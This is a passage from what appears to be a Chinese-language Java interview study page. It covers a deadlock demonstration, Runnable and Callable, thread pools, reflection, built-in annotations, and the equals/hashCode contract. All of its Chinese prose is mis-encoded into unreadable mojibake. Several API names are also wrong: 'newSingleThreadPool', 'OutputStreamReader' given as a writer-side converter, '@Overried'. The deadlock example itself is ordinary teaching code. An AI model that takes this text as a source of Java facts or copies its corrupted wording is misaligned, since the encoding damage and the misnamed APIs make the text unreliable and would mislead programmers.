·ï¼Œçº¿ç¨‹1â€³ç¡è§‰â€ç¡å®Œï¼Œçº¿ç¨‹2å·²ç»è·å–äº†lock2çš„å¯¹è±¡é”äº†ï¼Œçº¿ç¨‹1æ­¤æ—¶å°è¯•è·å–lock2çš„å¯¹è±¡é”ï¼Œä¾¿è¢«é˜»å¡ï¼Œæ­¤æ—¶ä¸€ä¸ªæ­»é”å°±å½¢æˆäº†ã€‚</p><p>æ­»é”çš„å®ç°ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeadLockDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">lockA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">lockB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> Thread.currentThread().getName();</span><br><span class="line">                <span class="keyword">synchronized</span> (lockA) &#123;</span><br><span class="line">                    System.out.println(name + <span class="string">&quot; got lockA,  want LockB&quot;</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line"></span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">synchronized</span> (lockB) &#123;</span><br><span class="line">                        System.out.println(name + <span class="string">&quot; got lockB&quot;</span>);</span><br><span class="line">                        System.out.println(name + <span class="string">&quot;: say Hello!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;çº¿ç¨‹-A&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> Thread.currentThread().getName();</span><br><span class="line">                <span class="keyword">synchronized</span> (lockB) &#123;</span><br><span class="line">                    System.out.println(name + <span class="string">&quot; got lockB, want LockA&quot;</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line"></span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">synchronized</span> (lockA) &#123;</span><br><span class="line">                        System.out.println(name + <span class="string">&quot; got lockA&quot;</span>);</span><br><span class="line">                        System.out.println(name + <span class="string">&quot;: say Hello!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;çº¿ç¨‹-B&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœæ˜¯ï¼š</p><p>çº¿ç¨‹-A got lockA, want LockB</p><p>çº¿ç¨‹-B got lockB, want LockA</p><h2><span id="ç®€å•ä»‹ç»ä¸€ä¸‹runnableå’Œcallableçš„åŒºåˆ«å’Œç”¨æ³•">ç®€å•ä»‹ç»ä¸€ä¸‹Runnableå’ŒCallableçš„åŒºåˆ«å’Œç”¨æ³•</span></h2><p>åŒºåˆ«ï¼š</p><ol><li>Runnableæ‰§è¡Œæ–¹æ³•æ˜¯run(),Callableæ˜¯call()</li><li>å®ç°Runnableæ¥å£çš„ä»»åŠ¡çº¿ç¨‹æ— è¿”å›å€¼ï¼›å®ç°Callableæ¥å£çš„ä»»åŠ¡çº¿ç¨‹èƒ½è¿”å›æ‰§è¡Œç»“æœ</li><li>callæ–¹æ³•å¯ä»¥æŠ›å‡ºå¼‚å¸¸ï¼Œrunæ–¹æ³•è‹¥æœ‰å¼‚å¸¸åªèƒ½åœ¨å†…éƒ¨æ¶ˆåŒ–</li></ol><p>Futureæä¾›äº†ä¸‰ç§åŠŸèƒ½ï¼š</p><p>ã€€ã€€1ï¼‰åˆ¤æ–­ä»»åŠ¡æ˜¯å¦å®Œæˆï¼›</p><p>ã€€ã€€2ï¼‰èƒ½å¤Ÿä¸­æ–­ä»»åŠ¡ï¼›</p><p>ã€€ã€€3ï¼‰èƒ½å¤Ÿè·å–ä»»åŠ¡æ‰§è¡Œç»“æœã€‚</p><h2><span id="javaæœ‰å“ªå‡ ç§åˆ›å»ºå¤šçº¿ç¨‹çš„æ–¹å¼">Javaæœ‰å“ªå‡ ç§åˆ›å»ºå¤šçº¿ç¨‹çš„æ–¹å¼ï¼Ÿ</span></h2><ul><li>ç»§æ‰¿Threadç±»</li><li>å®ç°Runnableæ¥å£</li><li>å®ç°Callableæ¥å£é€šè¿‡FutureTaskåŒ…è£…å™¨æ¥åˆ›å»ºThreadçº¿ç¨‹</li><li>ä½¿ç”¨ExecutorServiceã€Callableã€Futureå®ç°æœ‰è¿”å›ç»“æœçš„å¤šçº¿ç¨‹ã€‚</li></ul><h2><span id="cyclibarriarå’Œcountdownlatchæœ‰ä»€ä¹ˆåŒºåˆ«">CycliBarriarå’ŒCountdownLatchæœ‰ä»€ä¹ˆåŒºåˆ«?</span></h2><p>cyclibarriar å°±æ˜¯æ …æ ï¼Œé¡¾åæ€ä¹‰ï¼šå°±æ˜¯ä¸€ä¸ªæ‹¦æˆªçš„è£…ç½®ã€‚å¤šä¸ªçº¿ç¨‹startåï¼Œåœ¨æ …æ å¤„é˜»å¡ä½ï¼Œä¸€èˆ¬å®šä¹‰æ …æ çš„æ—¶å€™ä¼šå®šä¹‰æœ‰å¤šå°‘ä¸ªçº¿ç¨‹ã€‚æ¯”å¦‚å®šä¹‰ä¸º4ä¸ªï¼Œé‚£ä¹ˆæœ‰ä¸‰ä¸ªçº¿ç¨‹åˆ°æ …æ å¤„ï¼Œå°±é˜»å¡ä½ï¼Œå¦‚æœæ²¡æœ‰ç¬¬å››ä¸ªï¼Œå°±ä¼šä¸€ç›´é˜»å¡ï¼ŒçŸ¥é“å¯åŠ¨ç¬¬å››ä¸ªçº¿ç¨‹åˆ°æ …æ å¤„ï¼Œæ‰€æœ‰çš„çº¿ç¨‹å¼€å§‹å…¨éƒ¨è¿›è¡Œå·¥ä½œã€‚æœ‰ç‚¹åƒèµ›é©¬çš„ä¾‹å­ã€‚æ‰€æœ‰çš„èµ›é©¬ä¸€ä¸ªä¸€ä¸ªåˆ°èµ·ç‚¹ï¼Œç„¶ååˆ°é½äº†ï¼Œåœ¨å¼€å§‹è·‘ã€‚</p><p>countdownlatchï¼šåˆå§‹åŒ–å®šä¹‰ä¸€ä¸ªæ•°å­—ï¼ˆæ•´å‹ï¼‰ï¼Œæ¯”å¦‚å®šä¹‰2ï¼Œä¸€ä¸ªçº¿ç¨‹å¯åŠ¨ååœ¨awaitå¤„åœæ­¢ä¸‹æ¥é˜»å¡ï¼Œè°ƒç”¨ä¸€æ¬¡countDownï¼Œä¼šå‡ä¸€ï¼ŒçŸ¥é“countDownåå˜ä¸º0æ—¶çš„æ—¶å€™ï¼Œçº¿ç¨‹æ‰ä¼šç»§ç»­è¿›è¡Œå·¥ä½œï¼Œå¦åˆ™ä¼šä¸€ç›´é˜»å¡ã€‚</p><h2><span id="çº¿ç¨‹æ± çš„ä½œç”¨æœ‰å“ªäº›">çº¿ç¨‹æ± çš„ä½œç”¨æœ‰å“ªäº›ï¼Ÿ</span></h2><p>çº¿ç¨‹æ± çš„ä½œç”¨ï¼š åœ¨ç¨‹åºå¯åŠ¨çš„æ—¶å€™å°±åˆ›å»ºè‹¥å¹²çº¿ç¨‹æ¥å“åº”å¤„ç†ï¼Œå®ƒä»¬è¢«ç§°ä¸ºçº¿ç¨‹æ± ï¼Œé‡Œé¢çš„çº¿ç¨‹å«å·¥ä½œçº¿ç¨‹<br>ç¬¬ä¸€ï¼šé™ä½èµ„æºæ¶ˆè€—ã€‚é€šè¿‡é‡å¤åˆ©ç”¨å·²åˆ›å»ºçš„çº¿ç¨‹é™ä½çº¿ç¨‹åˆ›å»ºå’Œé”€æ¯é€ æˆçš„æ¶ˆè€—ã€‚<br>ç¬¬äºŒï¼šæé«˜å“åº”é€Ÿåº¦ã€‚å½“ä»»åŠ¡åˆ°è¾¾æ—¶ï¼Œä»»åŠ¡å¯ä»¥ä¸éœ€è¦ç­‰åˆ°çº¿ç¨‹åˆ›å»ºå°±èƒ½ç«‹å³æ‰§è¡Œã€‚<br>ç¬¬ä¸‰ï¼šæé«˜çº¿ç¨‹çš„å¯ç®¡ç†æ€§ã€‚</p><p>å¸¸ç”¨çº¿ç¨‹æ± ï¼šExecutorService æ˜¯ä¸»è¦çš„å®ç°ç±»ï¼Œå…¶ä¸­å¸¸ç”¨çš„æœ‰</p><ol><li>Executors.newSingleThreadPool(),</li><li>newFixedThreadPool(),</li><li>newCachedTheadPool(), </li><li>newScheduledThreadPool()ã€‚</li></ol><h2><span id="java-åå°„æœºåˆ¶çš„ä½œç”¨">Java åå°„æœºåˆ¶çš„ä½œç”¨</span></h2><p>javaåå°„æœºåˆ¶çš„ä½œç”¨:</p><p>ï¼ˆ1ï¼‰åœ¨è¿è¡Œæ—¶åˆ¤æ–­ä»»æ„ä¸€ä¸ªå¯¹è±¡æ‰€å±çš„ç±»</p><p>ï¼ˆ2ï¼‰åœ¨è¿è¡Œæ—¶æ„é€ ä»»æ„ä¸€ä¸ªç±»çš„å¯¹è±¡</p><p>ï¼ˆ3ï¼‰åœ¨è¿è¡Œæ—¶åˆ¤æ–­ä»»æ„ä¸€ä¸ªç±»æ‰€å…·æœ‰çš„æˆå‘˜å˜é‡å’Œæ–¹æ³•</p><p>ï¼ˆ4ï¼‰åœ¨è¿è¡Œæ—¶è°ƒç”¨ä»»æ„ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•</p><p>åå°„å°±æ˜¯åŠ¨æ€åŠ è½½å¯¹è±¡ï¼Œå¹¶å¯¹å¯¹è±¡è¿›è¡Œå‰–æã€‚åœ¨è¿è¡ŒçŠ¶æ€ä¸­ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼›å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•ï¼Œè¿™ç§åŠ¨æ€è·å–ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡æ–¹æ³•çš„åŠŸèƒ½æˆä¸ºJavaåå°„æœºåˆ¶ã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong><br>å¯ä»¥åŠ¨æ€çš„åˆ›å»ºå¯¹è±¡å’Œç¼–è¯‘ï¼Œæœ€å¤§é™åº¦å‘æŒ¥äº†javaçš„çµæ´»æ€§ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong><br>å¯¹æ€§èƒ½æœ‰å½±å“ã€‚ä½¿ç”¨åå°„åŸºæœ¬ä¸Šä¸€ç§è§£é‡Šæ“ä½œï¼Œå‘Šè¯‰JVMæˆ‘ä»¬è¦åšä»€ä¹ˆå¹¶ä¸”æ»¡è¶³æˆ‘ä»¬çš„è¦æ±‚ï¼Œè¿™ç±»æ“ä½œæ€»æ˜¯æ…¢äºç›´æ¥æ‰§è¡Œjavaä»£ç ã€‚</p><h2><span id="åå°„æœºåˆ¶æœ‰å“ªäº›ä¼˜ç‚¹å’Œç¼ºç‚¹">åå°„æœºåˆ¶æœ‰å“ªäº›ä¼˜ç‚¹å’Œç¼ºç‚¹</span></h2><p><strong>1ã€ä¼˜ç‚¹ï¼š</strong></p><p>é™æ€ç¼–è¯‘ï¼š</p><p>åœ¨ç¼–è¯‘æ—¶ç¡®å®šç±»å‹ï¼Œç»‘å®šå¯¹è±¡ï¼Œå³é€šè¿‡ã€‚</p><p>åŠ¨æ€ç¼–è¯‘ï¼š</p><p>è¿è¡Œæ—¶ç¡®å®šç±»å‹ï¼Œç»‘å®šå¯¹è±¡ã€‚åŠ¨æ€ç¼–è¯‘æœ€å¤§é™åº¦çš„å‘æŒ¥äº†javaçš„çµæ´»æ€§ï¼Œä½“ç°äº†å¤šæ€çš„åº”ç”¨ï¼Œæœ‰åˆ©äºé™ä½ç±»ä¹‹é—´çš„è€¦åˆæ€§ã€‚</p><p>ä¸€å¥è¯ï¼Œåå°„æœºåˆ¶çš„ä¼˜ç‚¹å°±æ˜¯å¯ä»¥å®ç°åŠ¨æ€åˆ›å»ºå¯¹è±¡å’Œç¼–è¯‘ï¼Œä½“ç°å‡ºå¾ˆå¤§çš„çµæ´»æ€§ï¼Œç‰¹åˆ«æ˜¯åœ¨J2EEçš„å¼€å‘ä¸­å®ƒçš„çµæ´»æ€§å°±è¡¨ç°çš„ååˆ†æ˜æ˜¾ã€‚æ¯”å¦‚ï¼Œä¸€ä¸ªå¤§å‹çš„è½¯ä»¶ï¼Œä¸å¯èƒ½ä¸€æ¬¡å°±æŠŠæŠŠå®ƒè®¾è®¡çš„å¾ˆå®Œç¾ï¼Œå½“è¿™ä¸ªç¨‹åºç¼–è¯‘åï¼Œå‘å¸ƒäº†ï¼Œå½“å‘ç°éœ€è¦æ›´æ–°æŸäº›åŠŸèƒ½æ—¶ï¼Œæˆ‘ä»¬ä¸å¯èƒ½è¦ç”¨æˆ·æŠŠä»¥å‰çš„å¸è½½ï¼Œå†é‡æ–°å®‰è£…æ–°çš„ç‰ˆæœ¬ï¼Œå‡å¦‚è¿™æ ·çš„è¯ï¼Œè¿™ä¸ªè½¯ä»¶è‚¯å®šæ˜¯æ²¡æœ‰å¤šå°‘äººç”¨çš„ã€‚é‡‡ç”¨é™æ€çš„è¯ï¼Œéœ€è¦æŠŠæ•´ä¸ªç¨‹åºé‡æ–°ç¼–è¯‘ä¸€æ¬¡æ‰å¯ä»¥å®ç°åŠŸèƒ½çš„æ›´æ–°ï¼Œè€Œé‡‡ç”¨åå°„æœºåˆ¶çš„è¯ï¼Œå®ƒå°±å¯ä»¥ä¸ç”¨å¸è½½ï¼Œåªéœ€è¦åœ¨è¿è¡Œæ—¶æ‰åŠ¨æ€çš„åˆ›å»ºå’Œç¼–è¯‘ï¼Œå°±å¯ä»¥å®ç°è¯¥åŠŸèƒ½ã€‚</p><p><strong>2ã€ç¼ºç‚¹ï¼š</strong></p><p>æ˜¯å¯¹æ€§èƒ½æœ‰å½±å“ã€‚ä½¿ç”¨åå°„åŸºæœ¬ä¸Šæ˜¯ä¸€ç§è§£é‡Šæ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥å‘Šè¯‰JVMï¼Œæˆ‘ä»¬å¸Œæœ›åšä»€ä¹ˆå¹¶ä¸”å®ƒæ»¡è¶³æˆ‘ä»¬çš„è¦æ±‚ã€‚è¿™ç±»æ“ä½œæ€»æ˜¯æ…¢äºåªç›´æ¥æ‰§è¡Œç›¸åŒçš„æ“ä½œã€‚</p><h2><span id="åå°„åˆ›å»ºç±»å®ä¾‹çš„ä¸‰ç§æ–¹å¼">åå°„åˆ›å»ºç±»å®ä¾‹çš„ä¸‰ç§æ–¹å¼</span></h2><p>1ã€é€šè¿‡ä¸€ä¸ªå…¨é™ç±»ååˆ›å»ºä¸€ä¸ªå¯¹è±¡ </p><p>ï¼ˆ1ï¼‰ Class.forName(â€œå…¨é™ç±»åâ€); ä¾‹å¦‚ï¼šcom.mysql.jdbc.Driver Driverç±»å·²ç»è¢«åŠ è½½åˆ° jvmä¸­ï¼Œå¹¶ä¸”å®Œæˆäº†ç±»çš„åˆå§‹åŒ–å·¥ä½œå°±è¡Œäº† </p><p>ï¼ˆ2ï¼‰ç±»å.class; è·å–Class&lt;ï¼Ÿ&gt; clz å¯¹è±¡  </p><p>ï¼ˆ3ï¼‰å¯¹è±¡.getClass(); </p><p>2ã€ è·å–æ„é€ å™¨å¯¹è±¡ï¼Œé€šè¿‡æ„é€ å™¨newå‡ºä¸€ä¸ªå¯¹è±¡   </p><p>ï¼ˆ1ï¼‰Clazz.getConstructor([String.class]);   </p><p>ï¼ˆ2ï¼‰Con.newInstance([å‚æ•°]);</p><p>3ã€é€šè¿‡classå¯¹è±¡åˆ›å»ºä¸€ä¸ªå®ä¾‹å¯¹è±¡ï¼ˆå°±ç›¸å½“ä¸newç±»åï¼ˆï¼‰æ— å‚æ„é€ å™¨)   </p><p>1ï¼‰Clazz.newInstance();</p><h2><span id="jdkè‡ªå¸¦äº†å“ªäº›æ³¨è§£æœ‰ä»€ä¹ˆä½œç”¨">jdkè‡ªå¸¦äº†å“ªäº›æ³¨è§£ï¼Œæœ‰ä»€ä¹ˆä½œç”¨</span></h2><p>@Overried</p><p>å‘Šè¯‰ç¼–è¯‘å™¨è¦æ£€æŸ¥è¯¥æ–¹æ³•æ˜¯é‡å†™çˆ¶ç±»çš„æ–¹æ³•</p><p>@Deprecated</p><p>æ ‡è®°æŸä¸ªç±»æˆ–æ–¹æ³•ç­‰å·²ç»åºŸå¼ƒï¼Œä¸æ¨èä½¿ç”¨ï¼Œä¿ç•™ä»…ä¸ºå…¼å®¹ä»¥å‰çš„ç¨‹åº</p><p>@SuppressWarnings</p><p>æŠ‘åˆ¶ç¼–è¯‘å™¨è­¦å‘Š</p><p>@SafeVarargs</p><p>@FunctionalInterface</p><p>ç”¨æ¥æŒ‡å®šè¯¥æ¥å£æ˜¯å‡½æ•°å¼æ¥å£</p><p>å…ƒæ³¨è§£ä½äºJDKçš„java.lang.annotationåŒ…ä¸‹ï¼š</p><p>1ã€@Retention</p><p>å®šä¹‰æ³¨è§£çš„ä¿ç•™ç­–ç•¥ï¼ŒåŒ…æ‹¬ä»¥ä¸‹3ç§ç­–ç•¥ï¼š</p><p>@Retention(RetentionPolicy.SOURCE)  &#x2F;&#x2F;æ³¨è§£ä»…å­˜åœ¨äºæºç ä¸­ï¼Œåœ¨classå­—èŠ‚ç æ–‡ä»¶ä¸­ä¸åŒ…å«<br>@Retention(RetentionPolicy.CLASS)   &#x2F;&#x2F; é»˜è®¤çš„ä¿ç•™ç­–ç•¥ï¼Œæ³¨è§£ä¼šåœ¨classå­—èŠ‚ç æ–‡ä»¶ä¸­å­˜åœ¨ï¼Œä½†è¿è¡Œæ—¶æ— æ³•è·å¾—ï¼Œ<br>@Retention(RetentionPolicy.RUNTIME) &#x2F;&#x2F; æ³¨è§£ä¼šåœ¨classå­—èŠ‚ç æ–‡ä»¶ä¸­å­˜åœ¨ï¼Œåœ¨è¿è¡Œæ—¶å¯ä»¥é€šè¿‡åå°„è·å–åˆ°</p><p>2ã€@Target</p><p>å®šä¹‰æ³¨è§£çš„ä½¿ç”¨å¯¹è±¡ï¼Œæ³¨è§£å¯ä»¥ç”¨åœ¨ç±»ä¸Šã€æ–¹æ³•ä¸Šã€å±æ€§ä¸Šç­‰ï¼Œç”±ElementTypeæšä¸¾ç±»å®šä¹‰ï¼š</p><p>3ã€@Inherited</p><p>å­ç±»å¯ä»¥ç»§æ‰¿çˆ¶ç±»ä¸­çš„æ³¨è§£</p><p>4ã€@Documented</p><p>javadocå·¥å…·ä¼šä½¿ç”¨è¯¥æ³¨è§£ç”Ÿæˆæ–‡æ¡£</p><h2><span id="æ„é€ å™¨constructoræ˜¯å¦å¯è¢«é‡å†™override">æ„é€ å™¨ï¼ˆconstructorï¼‰æ˜¯å¦å¯è¢«é‡å†™ï¼ˆoverrideï¼‰</span></h2><p>æ„é€ å™¨ä¸èƒ½è¢«ç»§æ‰¿ï¼Œå› æ­¤ä¸èƒ½è¢«é‡å†™ï¼Œä½†å¯ä»¥è¢«é‡è½½ã€‚</p><h2><span id="ä¸¤ä¸ªå¯¹è±¡å€¼ç›¸åŒxequalsy-x3dx3d-trueä½†å´å¯æœ‰ä¸åŒçš„hash-codeè¿™å¥è¯å¯¹ä¸å¯¹">ä¸¤ä¸ªå¯¹è±¡å€¼ç›¸åŒ(x.equals(y) &#x3D;&#x3D; true)ï¼Œä½†å´å¯æœ‰ä¸åŒçš„hash codeï¼Œè¿™å¥è¯å¯¹ä¸å¯¹ï¼Ÿ</span></h2><p>ä¸å¯¹ï¼Œå¦‚æœä¸¤ä¸ªå¯¹è±¡xå’Œyæ»¡è¶³x.equals(y) &#x3D;&#x3D; trueï¼Œå®ƒä»¬çš„å“ˆå¸Œç ï¼ˆhash codeï¼‰åº”å½“ç›¸åŒã€‚Javaå¯¹äºeqaulsæ–¹æ³•å’ŒhashCodeæ–¹æ³•æ˜¯è¿™æ ·è§„å®šçš„ï¼š(1)å¦‚æœä¸¤ä¸ªå¯¹è±¡ç›¸åŒï¼ˆequalsæ–¹æ³•è¿”å›trueï¼‰ï¼Œé‚£ä¹ˆå®ƒä»¬çš„hashCodeå€¼ä¸€å®šè¦ç›¸åŒï¼›(2)å¦‚æœä¸¤ä¸ªå¯¹è±¡çš„hashCodeç›¸åŒï¼Œå®ƒä»¬å¹¶ä¸ä¸€å®šç›¸åŒã€‚å½“ç„¶ï¼Œä½ æœªå¿…è¦æŒ‰ç…§è¦æ±‚å»åšï¼Œä½†æ˜¯å¦‚æœä½ è¿èƒŒäº†ä¸Šè¿°åŸåˆ™å°±ä¼šå‘ç°åœ¨ä½¿ç”¨å®¹å™¨æ—¶ï¼Œç›¸åŒçš„å¯¹è±¡å¯ä»¥å‡ºç°åœ¨Seté›†åˆä¸­ï¼ŒåŒæ—¶å¢åŠ æ–°å…ƒç´ çš„æ•ˆç‡ä¼šå¤§å¤§ä¸‹é™ï¼ˆå¯¹äºä½¿ç”¨å“ˆå¸Œå­˜å‚¨çš„ç³»ç»Ÿï¼Œå¦‚æœå“ˆå¸Œç é¢‘ç¹çš„å†²çªå°†ä¼šé€ æˆå­˜å–æ€§èƒ½æ€¥å‰§ä¸‹é™ï¼‰ã€‚</p><p>è¡¥å……ï¼šå…³äºequalså’ŒhashCodeæ–¹æ³•ï¼Œå¾ˆå¤šJavaç¨‹åºéƒ½çŸ¥é“ï¼Œä½†å¾ˆå¤šäººä¹Ÿå°±æ˜¯ä»…ä»…çŸ¥é“è€Œå·²ï¼Œåœ¨Joshua Blochçš„å¤§ä½œã€ŠEffective Javaã€‹ï¼ˆå¾ˆå¤šè½¯ä»¶å…¬å¸ï¼Œã€ŠEffective Javaã€‹ã€ã€ŠJavaç¼–ç¨‹æ€æƒ³ã€‹ä»¥åŠã€Šé‡æ„ï¼šæ”¹å–„æ—¢æœ‰ä»£ç è´¨é‡ã€‹æ˜¯Javaç¨‹åºå‘˜å¿…çœ‹ä¹¦ç±ï¼Œå¦‚æœä½ è¿˜æ²¡çœ‹è¿‡ï¼Œé‚£å°±èµ¶ç´§å»äºšé©¬é€Šä¹°ä¸€æœ¬å§ï¼‰ä¸­æ˜¯è¿™æ ·ä»‹ç»equalsæ–¹æ³•çš„ï¼šé¦–å…ˆequalsæ–¹æ³•å¿…é¡»æ»¡è¶³è‡ªåæ€§ï¼ˆx.equals(x)å¿…é¡»è¿”å›trueï¼‰ã€å¯¹ç§°æ€§ï¼ˆx.equals(y)è¿”å›trueæ—¶ï¼Œy.equals(x)ä¹Ÿå¿…é¡»è¿”å›trueï¼‰ã€ä¼ é€’æ€§ï¼ˆx.equals(y)å’Œy.equals(z)éƒ½è¿”å›trueæ—¶ï¼Œx.equals(z)ä¹Ÿå¿…é¡»è¿”å›trueï¼‰å’Œä¸€è‡´æ€§ï¼ˆå½“xå’Œyå¼•ç”¨çš„å¯¹è±¡ä¿¡æ¯æ²¡æœ‰è¢«ä¿®æ”¹æ—¶ï¼Œå¤šæ¬¡è°ƒç”¨x.equals(y)åº”è¯¥å¾—åˆ°åŒæ ·çš„è¿”å›å€¼ï¼‰ï¼Œè€Œä¸”å¯¹äºä»»ä½•énullå€¼çš„å¼•ç”¨xï¼Œx.equals(null)å¿…é¡»è¿”å›falseã€‚å®ç°é«˜è´¨é‡çš„equalsæ–¹æ³•çš„è¯€çªåŒ…æ‹¬ï¼š1. ä½¿ç”¨&#x3D;&#x3D;æ“ä½œç¬¦æ£€æŸ¥â€å‚æ•°æ˜¯å¦ä¸ºè¿™ä¸ªå¯¹è±¡çš„å¼•ç”¨â€ï¼›2. ä½¿ç”¨instanceofæ“ä½œç¬¦æ£€æŸ¥â€å‚æ•°æ˜¯å¦ä¸ºæ­£ç¡®çš„ç±»å‹â€ï¼›3. å¯¹äºç±»ä¸­çš„å…³é”®å±æ€§ï¼Œæ£€æŸ¥å‚æ•°ä¼ å…¥å¯¹è±¡çš„å±æ€§æ˜¯å¦ä¸ä¹‹ç›¸åŒ¹é…ï¼›4. ç¼–å†™å®Œequalsæ–¹æ³•åï¼Œé—®è‡ªå·±å®ƒæ˜¯å¦æ»¡è¶³å¯¹ç§°æ€§ã€ä¼ é€’æ€§ã€ä¸€è‡´æ€§ï¼›5. é‡å†™equalsæ—¶æ€»æ˜¯è¦é‡å†™hashCodeï¼›6. ä¸è¦å°†equalsæ–¹æ³•å‚æ•°ä¸­çš„Objectå¯¹è±¡æ›¿æ¢ä¸ºå…¶ä»–çš„ç±»å‹ï¼Œåœ¨é‡å†™æ—¶ä¸è¦å¿˜æ‰@Overrideæ³¨è§£ã€‚</p><h2><span id="char-å‹å˜é‡ä¸­èƒ½ä¸èƒ½å­˜è´®ä¸€ä¸ªä¸­æ–‡æ±‰å­—ä¸ºä»€ä¹ˆ">char å‹å˜é‡ä¸­èƒ½ä¸èƒ½å­˜è´®ä¸€ä¸ªä¸­æ–‡æ±‰å­—ï¼Œä¸ºä»€ä¹ˆï¼Ÿ</span></h2><p>charç±»å‹å¯ä»¥å­˜å‚¨ä¸€ä¸ªä¸­æ–‡æ±‰å­—ï¼Œå› ä¸ºJavaä¸­ä½¿ç”¨çš„ç¼–ç æ˜¯Unicodeï¼ˆä¸é€‰æ‹©ä»»ä½•ç‰¹å®šçš„ç¼–ç ï¼Œç›´æ¥ä½¿ç”¨å­—ç¬¦åœ¨å­—ç¬¦é›†ä¸­çš„ç¼–å·ï¼Œè¿™æ˜¯ç»Ÿä¸€çš„å”¯ä¸€æ–¹æ³•ï¼‰ï¼Œä¸€ä¸ªcharç±»å‹å 2ä¸ªå­—èŠ‚ï¼ˆ16æ¯”ç‰¹ï¼‰ï¼Œæ‰€ä»¥æ”¾ä¸€ä¸ªä¸­æ–‡æ˜¯æ²¡é—®é¢˜çš„ã€‚</p><p>è¡¥å……ï¼šä½¿ç”¨Unicodeæ„å‘³ç€å­—ç¬¦åœ¨JVMå†…éƒ¨å’Œå¤–éƒ¨æœ‰ä¸åŒçš„è¡¨ç°å½¢å¼ï¼Œåœ¨JVMå†…éƒ¨éƒ½æ˜¯Unicodeï¼Œå½“è¿™ä¸ªå­—ç¬¦è¢«ä»JVMå†…éƒ¨è½¬ç§»åˆ°å¤–éƒ¨æ—¶ï¼ˆä¾‹å¦‚å­˜å…¥æ–‡ä»¶ç³»ç»Ÿä¸­ï¼‰ï¼Œéœ€è¦è¿›è¡Œç¼–ç è½¬æ¢ã€‚æ‰€ä»¥Javaä¸­æœ‰å­—èŠ‚æµå’Œå­—ç¬¦æµï¼Œä»¥åŠåœ¨å­—ç¬¦æµå’Œå­—èŠ‚æµä¹‹é—´è¿›è¡Œè½¬æ¢çš„è½¬æ¢æµï¼Œå¦‚InputStreamReaderå’ŒOutputStreamReaderï¼Œè¿™ä¸¤ä¸ªç±»æ˜¯å­—èŠ‚æµå’Œå­—ç¬¦æµä¹‹é—´çš„é€‚é…å™¨ç±»ï¼Œæ‰¿æ‹…äº†ç¼–ç 